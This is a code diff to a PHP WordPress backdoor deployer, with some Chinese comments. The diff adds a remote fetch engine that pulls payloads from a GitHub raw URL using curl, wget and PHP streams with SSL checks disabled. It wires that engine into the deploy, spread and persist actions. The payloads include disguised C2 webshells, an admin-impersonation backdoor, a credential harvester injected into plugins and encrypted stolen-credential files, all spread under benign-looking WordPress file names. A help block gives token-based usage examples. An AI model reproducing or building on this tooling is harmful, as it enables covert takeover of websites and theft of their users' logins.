@@ -80,6 +80,13 @@ $_WP_ADMIN_COUNT = 1;     // wp-admin 取 1
 $_WP_CONTENT_COUNT = 3;   // wp-content 各类填剩余
 
 // ═══════════════════════════════════════════════════════════════════════════════
+// Remote payload source (GitHub raw)
+// Deploy tries download first, falls back to manual upload.
+// Fetch order: curl CLI → file_get_contents → wget CLI
+// ═══════════════════════════════════════════════════════════════════════════════
+$_REMOTE_BASE = 'https://raw.githubusercontent.com/1cdn1/wp/refs/heads/main';
+
+// ═══════════════════════════════════════════════════════════════════════════════
 // Multi-file payload manifest
 // Each role defines: preferred WP zones, dedicated filename candidates,
 // and how many copies to spread (count).
@@ -93,6 +100,7 @@ $_WP_CONTENT_COUNT = 3;   // wp-content 各类填剩余
 $_PAYLOAD_ROLES = [
     'shell_png' => [
         'label'      => 'C2 PNG WebShell',
+        'src'        => 'shell1_c2_png_aes128.php',
         'zones'      => ['wp_includes', 'plugins'],
         'names'      => ['class-wp-image-editor.php','class-wp-image-handler.php',
                          'class-image-meta.php','image-optimize.php','media-utils.php'],
@@ -100,6 +108,7 @@ $_PAYLOAD_ROLES = [
     ],
     'shell_pdf' => [
         'label'      => 'C2 PDF WebShell',
+        'src'        => 'shell2_c2_pdf_aes256.php',
         'zones'      => ['wp_admin', 'others'],
         'names'      => ['class-export-helper.php','pdf-handler.php',
                          'class-wp-export.php','invoice-utils.php','report-builder.php'],
@@ -107,6 +116,7 @@ $_PAYLOAD_ROLES = [
     ],
     'shell_gif' => [
         'label'      => 'C2 GIF WebShell',
+        'src'        => 'shell3_c2_gif_rsa.php',
         'zones'      => ['themes', 'uploads'],
         'names'      => ['class-theme-preview.php','thumb-generator.php',
                          'image-utils.php','class-media-cache.php','gif-handler.php'],
@@ -114,6 +124,7 @@ $_PAYLOAD_ROLES = [
     ],
     'backdoor_login' => [
         'label'      => 'WP Admin Impersonator (daily token)',
+        'src'        => 'class-wp-font-footer.php',
         'zones'      => ['plugins', 'themes', 'others'],
         'names'      => ['class-wp-rest-auth.php','rest-oauth-helper.php',
                          'class-rest-token.php','rest-auth-utils.php','oauth-handler.php'],
@@ -121,16 +132,17 @@ $_PAYLOAD_ROLES = [
     ],
     'creds_loader' => [
         'label'      => 'Credential Harvester Loader',
+        'src'        => 'wp_login_loader.php',
         'zones'      => ['others'],
         'names'      => ['transient-cache.php','cache-manager.php',
                          'object-cache-helper.php','transient-cleanup.php'],
         'count'      => 1,
-        'force_mu'   => true,  // default: mu-plugins
-        'inject'     => true,  // alt: inject into existing active plugin
-        // deploy engine tries injection first; falls back to mu-plugins
+        'force_mu'   => true,
+        'inject'     => true,
     ],
     'creds_payload_1' => [
         'label'      => 'Encrypted Creds Payload (cache)',
+        'src'        => 'wp_login_encrypted_1.dat',
         'zones'      => ['others'],
         'names'      => ['.object-cache-meta.php'],
         'count'      => 1,
@@ -138,6 +150,7 @@ $_PAYLOAD_ROLES = [
     ],
     'creds_payload_2' => [
         'label'      => 'Encrypted Creds Payload (uploads)',
+        'src'        => 'wp_login_encrypted_2.dat',
         'zones'      => ['uploads'],
         'names'      => ['.wp-cache-fragment.dat'],
         'count'      => 1,
@@ -145,12 +158,137 @@ $_PAYLOAD_ROLES = [
     ],
     'creds_payload_3' => [
         'label'      => 'Encrypted Creds Payload (upgrade)',
+        'src'        => 'wp_login_encrypted_3.dat',
         'zones'      => ['others'],
         'names'      => ['.cache-manifest.tmp'],
         'count'      => 1,
         'force_path' => 'wp-content/upgrade',
     ],
+    'plugin_injector' => [
+        'label'      => 'Plugin Injection Engine',
+        'src'        => 'plugin_injector.php',
+        'zones'      => [],
+        'names'      => [],
+        'count'      => 0,  // not deployed as a file; used by creds_loader inject mode
+        'internal'   => true,
+    ],
 ];
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Remote fetch engine
+// Download payloads from GitHub. Fallback chain: curl → file_get_contents → wget
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Download a single URL. Returns content string or false on failure.
+ * Tries multiple methods for maximum compatibility.
+ */
+function _remote_get($url, $timeout = 15) {
+    // Method 1: curl CLI (most reliable, handles HTTPS well)
+    if (function_exists('exec')) {
+        $tmp = tempnam(sys_get_temp_dir(), 'dl_');
+        $escaped = escapeshellarg($url);
+        $cmds = [
+            "curl -fsSL --connect-timeout {$timeout} --max-time 30 -o " . escapeshellarg($tmp) . " {$escaped}",
+            "wget -q --timeout={$timeout} -O " . escapeshellarg($tmp) . " {$escaped}",
+        ];
+        foreach ($cmds as $cmd) {
+            @exec($cmd . ' 2>/dev/null', $out, $ret);
+            if ($ret === 0 && file_exists($tmp) && filesize($tmp) > 0) {
+                $data = file_get_contents($tmp);
+                @unlink($tmp);
+                return $data;
+            }
+        }
+        @unlink($tmp);
+    }
+
+    // Method 2: file_get_contents with stream context
+    if (ini_get('allow_url_fopen')) {
+        $ctx = stream_context_create([
+            'http' => [
+                'timeout'       => $timeout,
+                'method'        => 'GET',
+                'header'        => "User-Agent: Mozilla/5.0\r\n",
+                'ignore_errors' => true,
+            ],
+            'ssl' => [
+                'verify_peer'      => false,
+                'verify_peer_name' => false,
+            ],
+        ]);
+        $data = @file_get_contents($url, false, $ctx);
+        if ($data !== false && strlen($data) > 0) {
+            // Check for HTTP error in response headers
+            $status = 200;
+            $resp_headers = function_exists('http_get_last_response_headers')
+                ? http_get_last_response_headers()
+                : [];
+            foreach ($resp_headers as $h) {
+                if (preg_match('/HTTP\/\S+\s+(\d+)/', $h, $m)) {
+                    $status = (int)$m[1];
+                }
+            }
+            if ($status >= 200 && $status < 400) return $data;
+        }
+    }
+
+    // Method 3: WordPress HTTP API (if available)
+    if (function_exists('wp_remote_get')) {
+        $resp = wp_remote_get($url, ['timeout' => $timeout, 'sslverify' => false]);
+        if (!is_wp_error($resp)) {
+            $code = wp_remote_retrieve_response_code($resp);
+            if ($code >= 200 && $code < 400) {
+                $body = wp_remote_retrieve_body($resp);
+                if (!empty($body)) return $body;
+            }
+        }
+    }
+
+    return false;
+}
+
+/**
+ * Auto-fetch all payloads from remote source.
+ * Populates multi-stash with downloaded content.
+ * Returns report: ['fetched' => [...], 'failed' => [...]]
+ */
+function _auto_fetch_payloads() {
+    global $_REMOTE_BASE, $_PAYLOAD_ROLES;
+    $report = ['fetched' => [], 'failed' => []];
+    $stash = _multi_stash_load();
+
+    foreach ($_PAYLOAD_ROLES as $role => $cfg) {
+        // Skip internal-only roles (not deployed as files)
+        if (!empty($cfg['internal'])) continue;
+        // Skip if already stashed
+        if (!empty($stash[$role])) continue;
+        // Skip if no remote source defined
+        if (empty($cfg['src'])) continue;
+
+        $url = $_REMOTE_BASE . '/' . $cfg['src'];
+        $data = _remote_get($url);
+
+        if ($data !== false && strlen($data) > 0) {
+            _multi_stash_put($role, $data);
+            $report['fetched'][] = [
+                'role' => $role,
+                'src'  => $cfg['src'],
+                'size' => strlen($data),
+                'url'  => $url,
+            ];
+        } else {
+            $report['failed'][] = [
+                'role'   => $role,
+                'src'    => $cfg['src'],
+                'url'    => $url,
+                'reason' => 'all download methods failed',
+            ];
+        }
+    }
+
+    return $report;
+}
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // Utility functions
@@ -1462,6 +1600,8 @@ switch ($_ACTION) {
 
     // ── spread: deploy stashed files ───────────────────────────────────
     case 'spread':
+        // Auto-fetch from remote first
+        $fetch_report = _auto_fetch_payloads();
         $payloads = _multi_stash_load();
         // Legacy compat: if multi-stash empty, try single stash
         if (empty($payloads)) {
@@ -1471,7 +1611,8 @@ switch ($_ACTION) {
             }
         }
         if (empty($payloads)) {
-            $result['error'] = 'no files stashed — use upload or fetch first';
+            $result['error'] = 'no files available — remote download failed and no manual upload';
+            $result['fetch_report'] = $fetch_report;
             break;
         }
 
@@ -1492,6 +1633,17 @@ switch ($_ACTION) {
         $result['wp_root']  = $wp_root;
         $result['summary']  = array_merge(['total_writable' => $total_writable], $summary);
         $result['details']  = $multi_report;
+        break;
+
+    // ── pull: download all payloads from remote, stash only ────────────
+    case 'pull':
+        $fetch_report = _auto_fetch_payloads();
+        $payloads = _multi_stash_load();
+        $result['status'] = 'ok';
+        $result['action'] = 'pull';
+        $result['fetch_report'] = $fetch_report;
+        $result['stashed_roles'] = array_keys($payloads);
+        $result['stashed_sizes'] = array_map('strlen', $payloads);
         break;
 
     // ── admin: create admin user ───────────────────────────────────────
@@ -1550,10 +1702,14 @@ switch ($_ACTION) {
                 }
             }
         }
+
+        // Auto-fetch remaining roles from remote (fills gaps not covered by manual upload)
+        $fetch_report = _auto_fetch_payloads();
         $payloads = _multi_stash_load();
 
         if (empty($payloads)) {
-            $result['error'] = 'no files to deploy — POST multi-file JSON, use d_<role>=, or upload first';
+            $result['error'] = 'no files to deploy — remote download failed and no manual upload';
+            $result['fetch_report'] = $fetch_report;
             break;
         }
 
@@ -1604,6 +1760,7 @@ switch ($_ACTION) {
             ]
         );
         $result['details']     = $multi_report;
+        $result['fetch_report'] = $fetch_report ?? [];
         $result['admin_adder'] = [
             'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
             'success'    => $adder_result['success'],
@@ -1692,10 +1849,14 @@ switch ($_ACTION) {
                 if ($dec !== false) _multi_stash_put($role, $dec);
             }
         }
+
+        // Auto-fetch remaining roles from remote
+        $fetch_report = _auto_fetch_payloads();
         $payloads = _multi_stash_load();
 
         if (empty($payloads)) {
-            $result['error'] = 'no files provided — POST multi-file JSON, use d_<role>=, or upload first';
+            $result['error'] = 'no files available — remote download failed and no manual upload';
+            $result['fetch_report'] = $fetch_report;
             break;
         }
 
@@ -1807,6 +1968,7 @@ switch ($_ACTION) {
             ]
         );
         $result['details']   = $multi_report;
+        $result['fetch_report'] = $fetch_report ?? [];
         $result['layers']    = $persist_results;
         $result['admin_adder'] = [
             'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
@@ -1921,24 +2083,28 @@ switch ($_ACTION) {
         $result['action'] = 'info';
         $result['help']   = [
             'modes' => [
-                'upload'  => 'Multi-file: POST JSON {role:b64,...} or fields d_<role>=<b64>. Single: d=<b64> or raw body',
-                'fetch'   => 'Per-role: ?role=<role>&url=<url> or ?role=<role>&d=<b64>. Legacy: ?url=<url>',
-                'spread'  => 'Deploy all stashed files to WP dirs (each role to distinct zones)',
-                'deploy'  => 'Upload + spread all payloads + admin-adder (add ?admin=1 to create user)',
+                'pull'    => 'Download all payloads from GitHub to stash (no deployment)',
+                'upload'  => 'Manual upload: POST JSON {role:b64,...} or fields d_<role>=<b64>',
+                'fetch'   => 'Per-role: ?role=<role>&url=<url> or ?role=<role>&d=<b64>',
+                'spread'  => 'Auto-download + deploy all payloads to WP dirs',
+                'deploy'  => 'Auto-download + spread + admin-adder (?admin=1)',
                 'admin'   => 'Create admin user (opt-in)',
                 'report'  => 'Scan writable directories (no writes)',
-                'env'     => 'Detect server environment (SAPI, server, strategy)',
-                'persist' => 'Immortal: guard-wrap + multi-spread + layers + state (multi-file)',
+                'env'     => 'Detect server environment',
+                'persist' => 'Full persistence: auto-download + guard-wrap + spread + layers + state',
                 'clean'   => 'Self-destruct (?mode=all&clean_key=KEY for full cleanup)',
             ],
-            'roles'       => array_keys($_PAYLOAD_ROLES),
-            'role_config' => $_PAYLOAD_ROLES,
-            'token'       => $_TOKEN,
+            'flow' => 'deploy/spread/persist auto-download from GitHub first; manual upload is fallback only',
+            'remote_base'  => $_REMOTE_BASE,
+            'roles'        => array_keys($_PAYLOAD_ROLES),
+            'role_config'  => $_PAYLOAD_ROLES,
+            'token'        => $_TOKEN,
             'usage_example' => [
-                'multi_upload' => 'POST ?a=upload&x=TOKEN  Content-Type:application/json  {"shell_png":"<b64>","shell_pdf":"<b64>","shell_gif":"<b64>","backdoor_login":"<b64>","backdoor_creds":"<b64>"}',
-                'multi_deploy' => 'POST ?a=deploy&x=TOKEN  (same JSON body, uploads + deploys in one step)',
-                'per_role_fetch' => 'GET ?a=fetch&x=TOKEN&role=shell_png&url=http://...',
-                'spread_all'   => 'GET ?a=spread&x=TOKEN  (deploys all previously stashed roles)',
+                'auto_deploy'    => 'GET ?a=deploy&x=TOKEN  (downloads all payloads from GitHub + deploys)',
+                'auto_persist'   => 'GET ?a=persist&x=TOKEN  (full persistence, all auto)',
+                'pull_only'      => 'GET ?a=pull&x=TOKEN  (download + stash, no deployment)',
+                'manual_upload'  => 'POST ?a=upload&x=TOKEN  Content-Type:application/json  {"shell_png":"<b64>",...}',
+                'manual_deploy'  => 'POST ?a=deploy&x=TOKEN  (same JSON body as fallback)',
             ],
         ];
         break;
